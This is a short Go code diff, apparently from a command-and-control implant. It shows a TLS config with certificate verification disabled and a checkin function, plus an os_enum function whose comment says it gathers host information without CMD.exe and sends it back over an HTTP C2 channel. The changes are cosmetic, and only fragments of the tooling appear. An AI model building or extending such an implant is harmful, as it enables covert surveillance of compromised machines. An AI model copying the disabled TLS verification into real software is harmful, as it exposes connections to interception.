@@ -24,7 +24,7 @@ var (
 	conf = &tls.Config{
 		InsecureSkipVerify: true,
 		//MinVersion:         tls.VersionTLS10,
-		//MaxVersion: tls.VersionTLS11,
+		//MaxVersion: tls.VersionTLS12,
 	}
 
 	tr = &http.Transport{
@@ -64,7 +64,7 @@ func checkin() string {
 
 }
 
-//enumerate OS without using CMD.exe and return values acorss http c2
+// enumerate OS without using CMD.exe and return values acorss http c2
 func os_enum() {
 
 	hostname, err := os.Hostname()
